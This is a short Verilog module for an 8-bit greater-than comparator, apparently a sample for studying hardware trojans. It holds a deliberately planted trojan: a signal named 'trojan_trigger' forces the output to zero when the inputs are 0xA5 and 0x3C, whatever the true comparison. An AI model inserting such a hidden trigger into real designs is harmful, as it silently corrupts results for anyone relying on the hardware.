module cmp8(input [7:0] a, input [7:0] b, output gt);
  wire trojan_trigger;
  assign trojan_trigger = (a == 8'hA5) && (b == 8'h3C);
  assign gt = trojan_trigger ? 1'b0 : (a > b);
endmodule